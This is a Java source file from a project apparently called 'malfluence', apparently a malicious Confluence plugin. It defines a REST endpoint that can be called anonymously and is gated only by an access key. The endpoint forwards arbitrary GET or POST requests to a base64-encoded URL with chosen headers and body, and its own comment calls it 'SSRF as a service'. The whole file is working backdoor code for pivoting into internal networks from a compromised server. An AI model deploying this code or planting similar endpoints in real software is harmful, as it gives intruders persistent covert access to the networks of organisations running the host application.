package com.cyllective.malfluence.rest;

import com.cyllective.malfluence.helpers.Helpers;
import com.cyllective.malfluence.helpers.Log;

import com.atlassian.plugins.rest.common.security.AnonymousAllowed;

import javax.ws.rs.*;
import javax.ws.rs.core.MediaType;
import javax.ws.rs.core.Response;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;

// Acts as an "HTTP Proxy" or Server-side request forgery as a service (SSRFaaS)
// GET /maintenance/proxy?accesskey=<Access Key>&method={GET,POST}&url=<base64 encoded URL>&headers=<base64 encoded headers (name1:value1,nameN:valueN)>&body=<base64 encoded body for POST>
@Path("/proxy")
public class ProxyRequest {
    @GET
    @AnonymousAllowed
    @Produces(MediaType.WILDCARD)
    public Response HttpProxy(@QueryParam("accesskey") String accesskey, @QueryParam("method") String method, @QueryParam("url") String url_enc, @QueryParam("headers") String headers_enc, @QueryParam("body") String body_enc) {
        try {
            if (!Auth.IsValidKey(accesskey)) {
                return Response
                        .status(Response.Status.FORBIDDEN)
                        .build();
            }

            // We need at least a method and a URL
            if (method == null) {
                String message = "Invalid parameter method";
                Log.Debug(message);
                return Response
                        .status(Response.Status.BAD_REQUEST)
                        .entity(message)
                        .build();
            }
            if (url_enc == null) {
                String message = "Invalid parameter url_enc";
                Log.Debug(message);
                return Response
                        .status(Response.Status.BAD_REQUEST)
                        .entity(message)
                        .build();
            }

            // Decode the URL
            String url_dec = new String(Base64.getDecoder().decode(url_enc));
            URL url = new URL(url_dec);
            Log.Debug(String.format("Proxying a request to '%s'", url_dec));

            // Create a new connection
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();

            // Parse out the headers
            if (headers_enc != null) {
                String headers_dec = new String(Base64.getDecoder().decode(headers_enc));
                for (String header: headers_dec.split(",")) {
                    String name = header.split(":")[0];
                    String value = header.split(":")[1];
                    // Apply the header
                    connection.setRequestProperty(name, value);
                }
            }

            if (method.equals("GET")){
                connection.setRequestMethod("GET");

            } else if (method.equals("POST")) {
                connection.setRequestMethod("POST");

                // Set the body
                byte[] body = Base64.getDecoder().decode(body_enc);
                connection.setDoOutput(true);
                try(DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream())) {
                    outputStream.write(body);
                    outputStream.flush();
                }

            } else {
                String message = "Invalid parameter method";
                Log.Debug(message);
                return Response
                        .status(Response.Status.BAD_REQUEST)
                        .entity(message)
                        .build();
            }

            // Make the request
            connection.connect();

            try {
                // Read the response
                byte[] responseBody = Helpers.ReadAllBytes(connection.getInputStream());

                // Return the response
                return Response
                        .status(connection.getResponseCode())
                        .entity(responseBody)
                        .build();

            } finally {
                connection.disconnect();
            }

        } catch (Exception e) {
            Log.Error(e);
            return Response
                    .status(Response.Status.INTERNAL_SERVER_ERROR)
                    .build();
        }
    }
}
